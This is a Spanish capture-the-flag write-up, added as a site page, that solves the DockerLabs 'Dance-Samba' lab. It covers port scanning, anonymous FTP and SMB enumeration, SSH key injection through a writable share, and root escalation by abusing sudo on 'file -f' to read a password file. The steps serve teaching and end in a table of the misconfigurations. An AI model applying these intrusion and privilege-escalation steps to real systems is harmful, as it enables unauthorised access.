@@ -1,0 +1,237 @@
+---
+title: Dance-Samba
+description: Resolución completa de la máquina virtual *Dance-Samba* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Dance-Samba**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone múltiples servicios, incluyendo FTP con acceso anónimo que revela un archivo con pistas sobre usuarios del sistema. Mediante enumeración SMB, se confirma la existencia del usuario `macarena` y se accede a su recurso compartido con permisos de escritura. Esto permite la inyección de una clave pública SSH, obteniendo acceso al sistema como `macarena`.
+Una vez dentro, se decodifica un archivo con una contraseña que permite ejecutar `sudo`. El usuario tiene permisos para ejecutar `file` como root, lo que permite leer archivos restringidos y obtener la contraseña de `root`, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Dance-Samba',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '26/08/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Dance-Samba.zip
+sudo bash auto_deploy.sh Dance-Samba.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Dance-Samba/{content,exploits,nmap,scripts}
+cd Dance-Samba
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **21/tcp** — FTP
+* **22/tcp** — SSH
+* **139/tcp** — SMB
+* **445/tcp** — SMB
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763778661/Ports_xntkxo.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p21,22,139,445 172.17.0.2
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1763778662/Services_uyiqyn.png)
+
+---
+
+### 1.3 Enumeración FTP
+
+El servicio FTP permite acceso anónimo:
+
+```bash
+ftp 172.17.0.2
+```
+
+![FTP](https://res.cloudinary.com/dewqswzke/image/upload/v1763778661/Ftp_nogabj.png)
+
+Se descarga el archivo `nota.txt`:
+
+![Nota.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1763778661/Nota.txt_dfdexy.png)
+
+Contiene pistas sobre los usuarios **Macarena** y **donald**.
+
+---
+
+### 1.4 Enumeración SMB
+
+Se utiliza `enum4linux`:
+
+```bash
+enum4linux -a 172.17.0.2
+```
+
+![Users](https://res.cloudinary.com/dewqswzke/image/upload/v1763778666/Users_jiv9dn.png)
+
+![Shares](https://res.cloudinary.com/dewqswzke/image/upload/v1763778662/Shares_e90iaq.png)
+
+Se confirma el usuario **macarena** y el recurso compartido **macarena**.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Acceso SMB
+
+Se accede al recurso compartido:
+
+```bash
+smbclient //172.17.0.2/macarena -U macarena
+```
+
+![SMB](https://res.cloudinary.com/dewqswzke/image/upload/v1763778663/Smbclient_rhhbpz.png)
+
+Se encuentra el archivo `user.txt`:
+
+![User.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1763778664/User.txt_r523su.png)
+
+### 2.2 Inyección de clave SSH
+
+El recurso tiene permisos de escritura. Se crea el directorio `.ssh` y se sube la clave pública:
+
+```bash
+mkdir .ssh
+ssh-keygen -t rsa -b 4096
+cp ~/.ssh/id_rsa.pub .
+cd .ssh/
+put id_rsa.pub
+cat id_rsa.pub > authorized_keys
+put authorized_keys
+```
+
+### 2.3 Acceso SSH
+
+Se accede al sistema:
+
+```bash
+ssh -i ~/.ssh/id_rsa macarena@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1763778664/SSH_usbfps.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De macarena → root
+
+Se encuentra un archivo con datos codificados:
+
+![Secret](https://res.cloudinary.com/dewqswzke/image/upload/v1763778662/Secret_l0odkc.png)
+
+Se decodifica con CyberChef:
+
+![CyberChef](https://res.cloudinary.com/dewqswzke/image/upload/v1763778661/CyberChef_rs7usb.png)
+
+Se obtiene la contraseña: `supersecurepasword`.
+
+Se verifica `sudo -l`:
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1763778664/Sudo-l_sosmhm.png)
+
+Se puede ejecutar `/usr/bin/file` como root.
+
+Se lee el archivo `/opt/password.txt`:
+
+```bash
+sudo file -f /opt/password.txt
+```
+
+![File](https://res.cloudinary.com/dewqswzke/image/upload/v1763778661/File_u75yhm.png)
+
+Se obtiene la contraseña de `root`:
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763778662/Root_py3euo.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "FTP anónimo habilitado",
+      severity: "Media",
+      impact: "Exposición de archivos con pistas del sistema"
+    },
+    {
+      vulnerability: "Permisos de escritura en home de usuario vía SMB",
+      severity: "Crítica",
+      impact: "Inyección de clave SSH y acceso al sistema"
+    },
+    {
+      vulnerability: "Codificación trivial de contraseñas (Base64/Base32)",
+      severity: "Alta",
+      impact: "Revelación de credenciales"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en file",
+      severity: "Crítica",
+      impact: "Lectura de archivos restringidos y escalada a root"
+    },
+    {
+      vulnerability: "Contraseña débil de root",
+      severity: "Crítica",
+      impact: "Acceso completo al sistema"
+    }
+  ]}
+/>
